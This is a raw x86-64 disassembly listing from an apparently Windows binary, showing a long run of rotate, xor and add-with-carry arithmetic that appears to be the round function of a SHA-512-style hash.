   140007a87:	45 3b c5             	cmp    %r13d,%r8d
   140007a8a:	83 d3 00             	adc    $0x0,%ebx
   140007a8d:	45 3b cc             	cmp    %r12d,%r9d
   140007a90:	4c 8b 65 30          	mov    0x30(%rbp),%r12
   140007a94:	83 d3 00             	adc    $0x0,%ebx
   140007a97:	45 3b d3             	cmp    %r11d,%r10d
   140007a9a:	13 59 e0             	adc    -0x20(%rcx),%ebx
   140007a9d:	03 59 98             	add    -0x68(%rcx),%ebx
   140007aa0:	48 83 6c 24 78 01    	subq   $0x1,0x78(%rsp)
   140007aa6:	89 59 18             	mov    %ebx,0x18(%rcx)
   140007aa9:	0f 85 11 fe ff ff    	jne    0x1400078c0
   140007aaf:	48 8b 45 50          	mov    0x50(%rbp),%rax
   140007ab3:	4c 8b 40 20          	mov    0x20(%rax),%r8
   140007ab7:	48 8b 08             	mov    (%rax),%rcx
   140007aba:	49 8b d0             	mov    %r8,%rdx
   140007abd:	4c 8b 48 08          	mov    0x8(%rax),%r9
   140007ac1:	45 8b f8             	mov    %r8d,%r15d
   140007ac4:	48 8b 78 28          	mov    0x28(%rax),%rdi
   140007ac8:	4c 8b 70 30          	mov    0x30(%rax),%r14
   140007acc:	4c 8b d7             	mov    %rdi,%r10
   140007acf:	4c 8b 58 10          	mov    0x10(%rax),%r11
   140007ad3:	49 8b de             	mov    %r14,%rbx
   140007ad6:	48 8b 70 18          	mov    0x18(%rax),%rsi
   140007ada:	45 8b e6             	mov    %r14d,%r12d
   140007add:	48 8b 40 38          	mov    0x38(%rax),%rax
   140007ae1:	44 8b ef             	mov    %edi,%r13d
   140007ae4:	48 c1 ea 20          	shr    $0x20,%rdx
   140007ae8:	48 c1 eb 20          	shr    $0x20,%rbx
   140007aec:	49 c1 ea 20          	shr    $0x20,%r10
   140007af0:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140007af4:	48 c1 e8 20          	shr    $0x20,%rax
   140007af8:	48 89 85 a8 00 00 00 	mov    %rax,0xa8(%rbp)
   140007aff:	89 45 40             	mov    %eax,0x40(%rbp)
   140007b02:	89 45 14             	mov    %eax,0x14(%rbp)
   140007b05:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140007b09:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140007b0d:	41 8b c3             	mov    %r11d,%eax
   140007b10:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140007b15:	48 89 4d 58          	mov    %rcx,0x58(%rbp)
   140007b19:	48 89 4c 24 18       	mov    %rcx,0x18(%rsp)
   140007b1e:	4c 89 4d 60          	mov    %r9,0x60(%rbp)
   140007b22:	4c 89 4c 24 58       	mov    %r9,0x58(%rsp)
   140007b27:	4c 89 5d 68          	mov    %r11,0x68(%rbp)
   140007b2b:	4c 89 5c 24 50       	mov    %r11,0x50(%rsp)
   140007b30:	48 89 75 70          	mov    %rsi,0x70(%rbp)
   140007b34:	48 89 74 24 68       	mov    %rsi,0x68(%rsp)
   140007b39:	4c 89 85 80 00 00 00 	mov    %r8,0x80(%rbp)
   140007b40:	48 89 55 78          	mov    %rdx,0x78(%rbp)
   140007b44:	48 89 bd 90 00 00 00 	mov    %rdi,0x90(%rbp)
   140007b4b:	4c 89 95 88 00 00 00 	mov    %r10,0x88(%rbp)
   140007b52:	4c 89 b5 a0 00 00 00 	mov    %r14,0xa0(%rbp)
   140007b59:	48 89 9d 98 00 00 00 	mov    %rbx,0x98(%rbp)
   140007b60:	89 55 38             	mov    %edx,0x38(%rbp)
   140007b63:	44 89 45 28          	mov    %r8d,0x28(%rbp)
   140007b67:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140007b6b:	44 89 45 88          	mov    %r8d,-0x78(%rbp)
   140007b6f:	89 55 8c             	mov    %edx,-0x74(%rbp)
   140007b72:	44 89 45 90          	mov    %r8d,-0x70(%rbp)
   140007b76:	89 55 94             	mov    %edx,-0x6c(%rbp)
   140007b79:	44 89 45 98          	mov    %r8d,-0x68(%rbp)
   140007b7d:	89 55 9c             	mov    %edx,-0x64(%rbp)
   140007b80:	44 89 45 a0          	mov    %r8d,-0x60(%rbp)
   140007b84:	89 54 24 08          	mov    %edx,0x8(%rsp)
   140007b88:	89 54 24 30          	mov    %edx,0x30(%rsp)
   140007b8c:	44 89 44 24 04       	mov    %r8d,0x4(%rsp)
   140007b91:	89 5d 80             	mov    %ebx,-0x80(%rbp)
   140007b94:	44 89 54 24 78       	mov    %r10d,0x78(%rsp)
   140007b99:	89 55 a4             	mov    %edx,-0x5c(%rbp)
   140007b9c:	44 89 45 a8          	mov    %r8d,-0x58(%rbp)
   140007ba0:	89 0c 24             	mov    %ecx,(%rsp)
   140007ba3:	89 4d ac             	mov    %ecx,-0x54(%rbp)
   140007ba6:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   140007baa:	89 4d b0             	mov    %ecx,-0x50(%rbp)
   140007bad:	89 4c 24 40          	mov    %ecx,0x40(%rsp)
   140007bb1:	89 4d b4             	mov    %ecx,-0x4c(%rbp)
   140007bb4:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   140007bb9:	89 4d b8             	mov    %ecx,-0x48(%rbp)
   140007bbc:	89 4d bc             	mov    %ecx,-0x44(%rbp)
   140007bbf:	44 89 5d c0          	mov    %r11d,-0x40(%rbp)
   140007bc3:	44 89 4d c4          	mov    %r9d,-0x3c(%rbp)
   140007bc7:	89 74 24 2c          	mov    %esi,0x2c(%rsp)
   140007bcb:	44 89 55 c8          	mov    %r10d,-0x38(%rbp)
   140007bcf:	89 7d cc             	mov    %edi,-0x34(%rbp)
   140007bd2:	89 55 d0             	mov    %edx,-0x30(%rbp)
   140007bd5:	44 89 45 d4          	mov    %r8d,-0x2c(%rbp)
   140007bd9:	89 5d d8             	mov    %ebx,-0x28(%rbp)
   140007bdc:	89 5d 1c             	mov    %ebx,0x1c(%rbp)
   140007bdf:	44 89 75 18          	mov    %r14d,0x18(%rbp)
   140007be3:	89 4d dc             	mov    %ecx,-0x24(%rbp)
   140007be6:	44 89 4d e0          	mov    %r9d,-0x20(%rbp)
   140007bea:	44 89 5d e4          	mov    %r11d,-0x1c(%rbp)
   140007bee:	89 55 e8             	mov    %edx,-0x18(%rbp)
   140007bf1:	8b 5c 24 1c          	mov    0x1c(%rsp),%ebx
   140007bf5:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140007bf9:	44 8b 5c 24 6c       	mov    0x6c(%rsp),%r11d
   140007bfe:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140007c03:	44 8b 74 24 2c       	mov    0x2c(%rsp),%r14d
   140007c08:	89 55 fc             	mov    %edx,-0x4(%rbp)
   140007c0b:	89 55 00             	mov    %edx,0x0(%rbp)
   140007c0e:	33 d2                	xor    %edx,%edx
   140007c10:	89 7d 20             	mov    %edi,0x20(%rbp)
   140007c13:	8b 7c 24 5c          	mov    0x5c(%rsp),%edi
   140007c17:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
   140007c1c:	44 89 45 ec          	mov    %r8d,-0x14(%rbp)
   140007c20:	44 89 55 f0          	mov    %r10d,-0x10(%rbp)
   140007c24:	44 89 55 24          	mov    %r10d,0x24(%rbp)
   140007c28:	89 4d f4             	mov    %ecx,-0xc(%rbp)
   140007c2b:	44 89 4d f8          	mov    %r9d,-0x8(%rbp)
   140007c2f:	44 89 45 04          	mov    %r8d,0x4(%rbp)
   140007c33:	89 4d 08             	mov    %ecx,0x8(%rbp)
   140007c36:	48 c7 45 48 0a 00 00 	movq   $0xa,0x48(%rbp)
   140007c3d:	00 
   140007c3e:	44 89 4d 0c          	mov    %r9d,0xc(%rbp)
   140007c42:	89 4c 24 74          	mov    %ecx,0x74(%rsp)
   140007c46:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140007c49:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140007c4d:	89 7c 24 0c          	mov    %edi,0xc(%rsp)
   140007c51:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140007c55:	eb 17                	jmp    0x140007c6e
   140007c57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140007c5e:	00 00 
   140007c60:	44 8b 64 24 68       	mov    0x68(%rsp),%r12d
   140007c65:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   140007c6a:	8b 5c 24 20          	mov    0x20(%rsp),%ebx
   140007c6e:	c1 64 24 10 12       	shll   $0x12,0x10(%rsp)
   140007c73:	c1 6c 24 08 09       	shrl   $0x9,0x8(%rsp)
   140007c78:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
   140007c7d:	8b 45 a4             	mov    -0x5c(%rbp),%eax
   140007c80:	41 f7 d0             	not    %r8d
   140007c83:	23 44 24 78          	and    0x78(%rsp),%eax
   140007c87:	44 23 45 80          	and    -0x80(%rbp),%r8d
   140007c8b:	44 8b 4d 98          	mov    -0x68(%rbp),%r9d
   140007c8f:	44 33 c0             	xor    %eax,%r8d
   140007c92:	8b 45 88             	mov    -0x78(%rbp),%eax
   140007c95:	8b 4d 8c             	mov    -0x74(%rbp),%ecx
   140007c98:	8b 7d 90             	mov    -0x70(%rbp),%edi
   140007c9b:	f7 54 24 04          	notl   0x4(%rsp)
   140007c9f:	44 21 64 24 04       	and    %r12d,0x4(%rsp)
   140007ca4:	44 8b 64 24 04       	mov    0x4(%rsp),%r12d
   140007ca9:	4c 8b 55 40          	mov    0x40(%rbp),%r10
   140007cad:	c1 e0 0e             	shl    $0xe,%eax
   140007cb0:	c1 e9 12             	shr    $0x12,%ecx
   140007cb3:	0b c8                	or     %eax,%ecx
   140007cb5:	c1 ef 12             	shr    $0x12,%edi
   140007cb8:	48 8b 45 38          	mov    0x38(%rbp),%rax
   140007cbc:	c1 e8 0e             	shr    $0xe,%eax
   140007cbf:	41 c1 e7 12          	shl    $0x12,%r15d
   140007cc3:	41 0b c7             	or     %r15d,%eax
   140007cc6:	41 c1 e9 09          	shr    $0x9,%r9d
   140007cca:	44 8b 7d 94          	mov    -0x6c(%rbp),%r15d
   140007cce:	33 c8                	xor    %eax,%ecx
   140007cd0:	8b 45 9c             	mov    -0x64(%rbp),%eax
   140007cd3:	c1 e0 17             	shl    $0x17,%eax
   140007cd6:	41 0b c1             	or     %r9d,%eax
   140007cd9:	41 c1 e7 0e          	shl    $0xe,%r15d
   140007cdd:	33 c8                	xor    %eax,%ecx
   140007cdf:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140007ce4:	44 0b ff             	or     %edi,%r15d
   140007ce7:	48 8d 05 92 9c ff ff 	lea    -0x636e(%rip),%rax        # 0x140001980
   140007cee:	44 8b 4c 02 04       	mov    0x4(%rdx,%rax,1),%r9d
   140007cf3:	41 03 c8             	add    %r8d,%ecx
   140007cf6:	8b 94 15 b4 00 00 00 	mov    0xb4(%rbp,%rdx,1),%edx
   140007cfd:	8b 7d 28             	mov    0x28(%rbp),%edi
   140007d00:	c1 ef 0e             	shr    $0xe,%edi
   140007d03:	09 7c 24 10          	or     %edi,0x10(%rsp)
   140007d07:	45 8d 04 09          	lea    (%r9,%rcx,1),%r8d
   140007d0b:	44 33 7c 24 10       	xor    0x10(%rsp),%r15d
   140007d10:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
   140007d14:	8b 7d a0             	mov    -0x60(%rbp),%edi
   140007d17:	44 03 d0             	add    %eax,%r10d
   140007d1a:	c1 e7 17             	shl    $0x17,%edi
   140007d1d:	09 7c 24 08          	or     %edi,0x8(%rsp)
   140007d21:	44 33 7c 24 08       	xor    0x8(%rsp),%r15d
   140007d26:	8b 7d a8             	mov    -0x58(%rbp),%edi
   140007d29:	41 23 fd             	and    %r13d,%edi
   140007d2c:	44 33 e7             	xor    %edi,%r12d
   140007d2f:	45 03 e7             	add    %r15d,%r12d
   140007d32:	44 3b 55 14          	cmp    0x14(%rbp),%r10d
   140007d36:	41 83 d4 00          	adc    $0x0,%r12d
   140007d3a:	3b 4c 24 30          	cmp    0x30(%rsp),%ecx
   140007d3e:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   140007d42:	41 83 d4 00          	adc    $0x0,%r12d
   140007d46:	3b c2                	cmp    %edx,%eax
   140007d48:	8b 54 24 40          	mov    0x40(%rsp),%edx
   140007d4c:	48 8d 05 2d 9c ff ff 	lea    -0x63d3(%rip),%rax        # 0x140001980
   140007d53:	41 83 d4 00          	adc    $0x0,%r12d
   140007d57:	45 3b c1             	cmp    %r9d,%r8d
   140007d5a:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   140007d5f:	41 83 d4 00          	adc    $0x0,%r12d
   140007d63:	c1 e9 02             	shr    $0x2,%ecx
   140007d66:	c1 ea 07             	shr    $0x7,%edx
   140007d69:	45 03 24 01          	add    (%r9,%rax,1),%r12d
   140007d6d:	8b c3                	mov    %ebx,%eax
   140007d6f:	46 03 a4 0d b0 00 00 	add    0xb0(%rbp,%r9,1),%r12d
   140007d76:	00 
   140007d77:	44 03 64 24 28       	add    0x28(%rsp),%r12d
   140007d7c:	c1 e0 19             	shl    $0x19,%eax
   140007d7f:	0b d0                	or     %eax,%edx
   140007d81:	8b c3                	mov    %ebx,%eax
   140007d83:	c1 e0 1e             	shl    $0x1e,%eax
   140007d86:	0b c8                	or     %eax,%ecx
   140007d88:	8b c3                	mov    %ebx,%eax
   140007d8a:	33 d1                	xor    %ecx,%edx
   140007d8c:	8b 0c 24             	mov    (%rsp),%ecx
   140007d8f:	c1 e1 04             	shl    $0x4,%ecx
   140007d92:	c1 e8 1c             	shr    $0x1c,%eax
   140007d95:	44 8b 7c 24 0c       	mov    0xc(%rsp),%r15d
   140007d9a:	0b c8                	or     %eax,%ecx
   140007d9c:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140007da0:	33 d1                	xor    %ecx,%edx
   140007da2:	8b 7d b0             	mov    -0x50(%rbp),%edi
   140007da5:	33 c3                	xor    %ebx,%eax
   140007da7:	23 44 24 24          	and    0x24(%rsp),%eax
   140007dab:	44 23 fb             	and    %ebx,%r15d
   140007dae:	89 54 24 40          	mov    %edx,0x40(%rsp)
   140007db2:	8b cb                	mov    %ebx,%ecx
   140007db4:	41 33 c7             	xor    %r15d,%eax
   140007db7:	45 8b ec             	mov    %r12d,%r13d
   140007dba:	03 d0                	add    %eax,%edx
   140007dbc:	43 8d 04 1a          	lea    (%r10,%r11,1),%eax
   140007dc0:	41 3b c3             	cmp    %r11d,%eax
   140007dc3:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
   140007dc7:	44 8b 5d b4          	mov    -0x4c(%rbp),%r11d
   140007dcb:	41 83 d5 00          	adc    $0x0,%r13d
   140007dcf:	41 c1 e3 19          	shl    $0x19,%r11d
   140007dd3:	c1 e9 07             	shr    $0x7,%ecx
   140007dd6:	45 8d 04 12          	lea    (%r10,%rdx,1),%r8d
   140007dda:	44 0b d9             	or     %ecx,%r11d
   140007ddd:	c1 e7 1e             	shl    $0x1e,%edi
   140007de0:	8b cb                	mov    %ebx,%ecx
   140007de2:	44 89 44 24 58       	mov    %r8d,0x58(%rsp)
   140007de7:	c1 e9 02             	shr    $0x2,%ecx
   140007dea:	45 03 ee             	add    %r14d,%r13d
   140007ded:	0b f9                	or     %ecx,%edi
   140007def:	44 89 6c 24 18       	mov    %r13d,0x18(%rsp)
   140007df4:	48 8b 44 24 18       	mov    0x18(%rsp),%rax
   140007df9:	44 33 df             	xor    %edi,%r11d
   140007dfc:	8b 7d ac             	mov    -0x54(%rbp),%edi
   140007dff:	8b cb                	mov    %ebx,%ecx
   140007e01:	8b 5d bc             	mov    -0x44(%rbp),%ebx
   140007e04:	c1 e1 04             	shl    $0x4,%ecx
   140007e07:	23 de                	and    %esi,%ebx
   140007e09:	c1 ef 1c             	shr    $0x1c,%edi
   140007e0c:	0b f9                	or     %ecx,%edi
   140007e0e:	44 89 6c 24 70       	mov    %r13d,0x70(%rsp)
   140007e13:	8b 4d c4             	mov    -0x3c(%rbp),%ecx
   140007e16:	44 33 df             	xor    %edi,%r11d
   140007e19:	23 4d c0             	and    -0x40(%rbp),%ecx
   140007e1c:	33 cb                	xor    %ebx,%ecx
   140007e1e:	8b 5d b8             	mov    -0x48(%rbp),%ebx
   140007e21:	23 5c 24 38          	and    0x38(%rsp),%ebx
   140007e25:	33 cb                	xor    %ebx,%ecx
   140007e27:	48 8b d8             	mov    %rax,%rbx
   140007e2a:	44 03 d9             	add    %ecx,%r11d
   140007e2d:	8b 4d d0             	mov    -0x30(%rbp),%ecx
   140007e30:	45 3b c2             	cmp    %r10d,%r8d
   140007e33:	41 83 d4 00          	adc    $0x0,%r12d
   140007e37:	3b 54 24 40          	cmp    0x40(%rsp),%edx
   140007e3b:	41 8b d5             	mov    %r13d,%edx
   140007e3e:	45 13 e3             	adc    %r11d,%r12d
   140007e41:	48 c1 eb 20          	shr    $0x20,%rbx
   140007e45:	23 cb                	and    %ebx,%ecx
   140007e47:	c1 ea 09             	shr    $0x9,%edx
   140007e4a:	8b f3                	mov    %ebx,%esi
   140007e4c:	44 89 64 24 50       	mov    %r12d,0x50(%rsp)
   140007e51:	f7 d6                	not    %esi
   140007e53:	8b fb                	mov    %ebx,%edi
   140007e55:	23 75 c8             	and    -0x38(%rbp),%esi
   140007e58:	33 f1                	xor    %ecx,%esi
   140007e5a:	c1 ef 0e             	shr    $0xe,%edi
   140007e5d:	41 8b cd             	mov    %r13d,%ecx
   140007e60:	c1 e1 12             	shl    $0x12,%ecx
   140007e63:	0b f9                	or     %ecx,%edi
   140007e65:	8b cb                	mov    %ebx,%ecx
   140007e67:	c1 e1 17             	shl    $0x17,%ecx
   140007e6a:	0b d1                	or     %ecx,%edx
   140007e6c:	8b cb                	mov    %ebx,%ecx
   140007e6e:	33 fa                	xor    %edx,%edi
   140007e70:	c1 e9 12             	shr    $0x12,%ecx
   140007e73:	41 8b d5             	mov    %r13d,%edx
   140007e76:	c1 e2 0e             	shl    $0xe,%edx
   140007e79:	0b d1                	or     %ecx,%edx
   140007e7b:	48 8d 0d fe 9a ff ff 	lea    -0x6502(%rip),%rcx        # 0x140001980
   140007e82:	45 8b 5c 09 0c       	mov    0xc(%r9,%rcx,1),%r11d
   140007e87:	33 fa                	xor    %edx,%edi
   140007e89:	03 fe                	add    %esi,%edi
   140007e8b:	45 8d 14 3b          	lea    (%r11,%rdi,1),%r10d
   140007e8f:	46 8b 8c 0d bc 00 00 	mov    0xbc(%rbp,%r9,1),%r9d
   140007e96:	00 
   140007e97:	8b d3                	mov    %ebx,%edx
   140007e99:	44 8b 75 d8          	mov    -0x28(%rbp),%r14d
   140007e9d:	41 8b cd             	mov    %r13d,%ecx
   140007ea0:	c1 e2 12             	shl    $0x12,%edx
   140007ea3:	c1 e9 0e             	shr    $0xe,%ecx
   140007ea6:	0b d1                	or     %ecx,%edx
   140007ea8:	47 8d 04 0a          	lea    (%r10,%r9,1),%r8d
   140007eac:	89 14 24             	mov    %edx,(%rsp)
   140007eaf:	45 03 f0             	add    %r8d,%r14d
   140007eb2:	8b cb                	mov    %ebx,%ecx
   140007eb4:	41 8b d5             	mov    %r13d,%edx
   140007eb7:	c1 ea 12             	shr    $0x12,%edx
   140007eba:	c1 e1 0e             	shl    $0xe,%ecx
   140007ebd:	0b d1                	or     %ecx,%edx
   140007ebf:	c1 eb 09             	shr    $0x9,%ebx
   140007ec2:	31 14 24             	xor    %edx,(%rsp)
   140007ec5:	41 8b cd             	mov    %r13d,%ecx
   140007ec8:	8b 14 24             	mov    (%rsp),%edx
   140007ecb:	c1 e1 17             	shl    $0x17,%ecx
   140007ece:	0b cb                	or     %ebx,%ecx
   140007ed0:	8b 5d d4             	mov    -0x2c(%rbp),%ebx
   140007ed3:	33 d1                	xor    %ecx,%edx
   140007ed5:	41 23 dd             	and    %r13d,%ebx
   140007ed8:	41 8b cd             	mov    %r13d,%ecx
   140007edb:	f7 d1                	not    %ecx
   140007edd:	23 4d cc             	and    -0x34(%rbp),%ecx
   140007ee0:	33 cb                	xor    %ebx,%ecx
   140007ee2:	8b 5c 24 58          	mov    0x58(%rsp),%ebx
   140007ee6:	03 d1                	add    %ecx,%edx
   140007ee8:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140007eed:	3b fe                	cmp    %esi,%edi
   140007eef:	8b 74 24 50          	mov    0x50(%rsp),%esi
   140007ef3:	83 d2 00             	adc    $0x0,%edx
   140007ef6:	44 3b 75 1c          	cmp    0x1c(%rbp),%r14d
   140007efa:	83 d2 00             	adc    $0x0,%edx
   140007efd:	45 3b c1             	cmp    %r9d,%r8d
   140007f00:	4c 8d 05 79 9a ff ff 	lea    -0x6587(%rip),%r8        # 0x140001980
   140007f07:	44 8b ce             	mov    %esi,%r9d
   140007f0a:	83 d2 00             	adc    $0x0,%edx
   140007f0d:	45 3b d3             	cmp    %r11d,%r10d
   140007f10:	44 8b 54 24 0c       	mov    0xc(%rsp),%r10d
   140007f15:	45 8b dc             	mov    %r12d,%r11d
   140007f18:	13 94 0d b8 00 00 00 	adc    0xb8(%rbp,%rcx,1),%edx
   140007f1f:	42 03 54 01 08       	add    0x8(%rcx,%r8,1),%edx
   140007f24:	8b cb                	mov    %ebx,%ecx
   140007f26:	03 55 18             	add    0x18(%rbp),%edx
   140007f29:	44 33 54 24 20       	xor    0x20(%rsp),%r10d
   140007f2e:	c1 e9 1c             	shr    $0x1c,%ecx
   140007f31:	44 23 d3             	and    %ebx,%r10d
   140007f34:	89 14 24             	mov    %edx,(%rsp)
   140007f37:	45 33 d7             	xor    %r15d,%r10d
   140007f3a:	44 8b 3c 24          	mov    (%rsp),%r15d
   140007f3e:	41 8b d4             	mov    %r12d,%edx
   140007f41:	c1 ea 02             	shr    $0x2,%edx
   140007f44:	41 c1 e3 04          	shl    $0x4,%r11d
   140007f48:	44 0b d9             	or     %ecx,%r11d
   140007f4b:	8b cb                	mov    %ebx,%ecx
   140007f4d:	c1 e1 1e             	shl    $0x1e,%ecx
   140007f50:	0b d1                	or     %ecx,%edx
   140007f52:	8b cb                	mov    %ebx,%ecx
   140007f54:	44 33 da             	xor    %edx,%r11d
   140007f57:	c1 e1 19             	shl    $0x19,%ecx
   140007f5a:	41 8b d4             	mov    %r12d,%edx
   140007f5d:	44 8b 65 e4          	mov    -0x1c(%rbp),%r12d
   140007f61:	c1 ea 07             	shr    $0x7,%edx
   140007f64:	0b d1                	or     %ecx,%edx
   140007f66:	44 33 da             	xor    %edx,%r11d
   140007f69:	8b 54 24 24          	mov    0x24(%rsp),%edx
   140007f6d:	45 03 d3             	add    %r11d,%r10d
   140007f70:	41 8d 0c 16          	lea    (%r14,%rdx,1),%ecx
   140007f74:	3b ca                	cmp    %edx,%ecx
   140007f76:	89 4c 24 1c          	mov    %ecx,0x1c(%rsp)
   140007f7a:	43 8d 3c 16          	lea    (%r14,%r10,1),%edi
   140007f7e:	41 83 d4 00          	adc    $0x0,%r12d
   140007f82:	89 7c 24 24          	mov    %edi,0x24(%rsp)
   140007f86:	45 03 e7             	add    %r15d,%r12d
   140007f89:	44 89 64 24 18       	mov    %r12d,0x18(%rsp)
   140007f8e:	48 8b 4c 24 18       	mov    0x18(%rsp),%rcx
   140007f93:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   140007f98:	41 c1 e1 19          	shl    $0x19,%r9d
   140007f9c:	44 8b c6             	mov    %esi,%r8d
   140007f9f:	8b d3                	mov    %ebx,%edx
   140007fa1:	c1 ea 07             	shr    $0x7,%edx
   140007fa4:	44 0b ca             	or     %edx,%r9d
   140007fa7:	41 c1 e0 1e          	shl    $0x1e,%r8d
   140007fab:	8b d3                	mov    %ebx,%edx
   140007fad:	c1 ea 02             	shr    $0x2,%edx
   140007fb0:	44 0b c2             	or     %edx,%r8d
   140007fb3:	8b d3                	mov    %ebx,%edx
   140007fb5:	45 33 c8             	xor    %r8d,%r9d
   140007fb8:	c1 e2 04             	shl    $0x4,%edx
   140007fbb:	44 8b c6             	mov    %esi,%r8d
   140007fbe:	41 c1 e8 1c          	shr    $0x1c,%r8d
   140007fc2:	44 0b c2             	or     %edx,%r8d
   140007fc5:	8b 55 e0             	mov    -0x20(%rbp),%edx
   140007fc8:	33 55 dc             	xor    -0x24(%rbp),%edx
   140007fcb:	45 33 c8             	xor    %r8d,%r9d
   140007fce:	44 8b 44 24 74       	mov    0x74(%rsp),%r8d
   140007fd3:	23 d6                	and    %esi,%edx
   140007fd5:	44 23 45 0c          	and    0xc(%rbp),%r8d
   140007fd9:	41 8b f4             	mov    %r12d,%esi
   140007fdc:	41 33 d0             	xor    %r8d,%edx
   140007fdf:	45 8b c4             	mov    %r12d,%r8d
   140007fe2:	44 03 ca             	add    %edx,%r9d
   140007fe5:	41 3b fe             	cmp    %r14d,%edi
   140007fe8:	48 8b f9             	mov    %rcx,%rdi
   140007feb:	41 83 d7 00          	adc    $0x0,%r15d
   140007fef:	45 3b d3             	cmp    %r11d,%r10d
   140007ff2:	45 13 f9             	adc    %r9d,%r15d
   140007ff5:	41 c1 e8 09          	shr    $0x9,%r8d
   140007ff9:	48 c1 ef 20          	shr    $0x20,%rdi
   140007ffd:	8b d7                	mov    %edi,%edx
   140007fff:	c1 e6 12             	shl    $0x12,%esi
   140008002:	44 8b f7             	mov    %edi,%r14d
   140008005:	48 c1 e8 20          	shr    $0x20,%rax
   140008009:	23 d0                	and    %eax,%edx
   14000800b:	44 89 3c 24          	mov    %r15d,(%rsp)
   14000800f:	44 8b 7d f0          	mov    -0x10(%rbp),%r15d
   140008013:	41 f7 d6             	not    %r14d
   140008016:	44 23 75 e8          	and    -0x18(%rbp),%r14d
   14000801a:	44 33 f2             	xor    %edx,%r14d
   14000801d:	8b d7                	mov    %edi,%edx
   14000801f:	c1 ea 0e             	shr    $0xe,%edx
   140008022:	0b f2                	or     %edx,%esi
   140008024:	8b d7                	mov    %edi,%edx
   140008026:	c1 e2 17             	shl    $0x17,%edx
   140008029:	44 0b c2             	or     %edx,%r8d
   14000802c:	8b d7                	mov    %edi,%edx
   14000802e:	41 33 f0             	xor    %r8d,%esi
   140008031:	c1 ea 12             	shr    $0x12,%edx
   140008034:	45 8b c4             	mov    %r12d,%r8d
   140008037:	41 c1 e0 0e          	shl    $0xe,%r8d
   14000803b:	44 0b c2             	or     %edx,%r8d
   14000803e:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   140008043:	41 33 f0             	xor    %r8d,%esi
   140008046:	4c 8d 05 33 99 ff ff 	lea    -0x66cd(%rip),%r8        # 0x140001980
   14000804d:	41 03 f6             	add    %r14d,%esi
   140008050:	42 8b 5c 02 14       	mov    0x14(%rdx,%r8,1),%ebx
   140008055:	45 8b c4             	mov    %r12d,%r8d
   140008058:	44 8b 94 15 c4 00 00 	mov    0xc4(%rbp,%rdx,1),%r10d
   14000805f:	00 
   140008060:	8b d7                	mov    %edi,%edx
   140008062:	c1 e2 12             	shl    $0x12,%edx
   140008065:	41 c1 e8 0e          	shr    $0xe,%r8d
   140008069:	44 0b c2             	or     %edx,%r8d
   14000806c:	44 8d 1c 33          	lea    (%rbx,%rsi,1),%r11d
   140008070:	44 89 44 24 08       	mov    %r8d,0x8(%rsp)
   140008075:	47 8d 0c 13          	lea    (%r11,%r10,1),%r9d
   140008079:	8b d7                	mov    %edi,%edx
   14000807b:	45 8b c4             	mov    %r12d,%r8d
   14000807e:	c1 e2 0e             	shl    $0xe,%edx
   140008081:	45 03 f9             	add    %r9d,%r15d
   140008084:	41 c1 e8 12          	shr    $0x12,%r8d
   140008088:	44 0b c2             	or     %edx,%r8d
   14000808b:	c1 ef 09             	shr    $0x9,%edi
   14000808e:	44 31 44 24 08       	xor    %r8d,0x8(%rsp)
   140008093:	41 8b d4             	mov    %r12d,%edx
   140008096:	c1 e2 17             	shl    $0x17,%edx
   140008099:	45 8b c4             	mov    %r12d,%r8d
   14000809c:	0b d7                	or     %edi,%edx
   14000809e:	8b 7c 24 08          	mov    0x8(%rsp),%edi
   1400080a2:	33 fa                	xor    %edx,%edi
   1400080a4:	41 f7 d0             	not    %r8d
   1400080a7:	41 8b d4             	mov    %r12d,%edx
   1400080aa:	44 23 45 ec          	and    -0x14(%rbp),%r8d
   1400080ae:	41 23 d5             	and    %r13d,%edx
   1400080b1:	44 8b 24 24          	mov    (%rsp),%r12d
   1400080b5:	44 33 c2             	xor    %edx,%r8d
   1400080b8:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400080bd:	41 03 f8             	add    %r8d,%edi
   1400080c0:	44 3b 7d 24          	cmp    0x24(%rbp),%r15d
   1400080c4:	4c 8d 05 b5 98 ff ff 	lea    -0x674b(%rip),%r8        # 0x140001980
   1400080cb:	83 d7 00             	adc    $0x0,%edi
   1400080ce:	41 3b f6             	cmp    %r14d,%esi
   1400080d1:	8b 74 24 24          	mov    0x24(%rsp),%esi
   1400080d5:	83 d7 00             	adc    $0x0,%edi
   1400080d8:	45 3b ca             	cmp    %r10d,%r9d
   1400080db:	45 8b d4             	mov    %r12d,%r10d
   1400080de:	45 8b cc             	mov    %r12d,%r9d
   1400080e1:	83 d7 00             	adc    $0x0,%edi
   1400080e4:	44 3b db             	cmp    %ebx,%r11d
   1400080e7:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   1400080ec:	41 8b dc             	mov    %r12d,%ebx
   1400080ef:	13 bc 15 c0 00 00 00 	adc    0xc0(%rbp,%rdx,1),%edi
   1400080f6:	42 03 7c 02 10       	add    0x10(%rdx,%r8,1),%edi
   1400080fb:	8b d6                	mov    %esi,%edx
   1400080fd:	03 7d 20             	add    0x20(%rbp),%edi
   140008100:	45 8b c4             	mov    %r12d,%r8d
   140008103:	c1 ea 1c             	shr    $0x1c,%edx
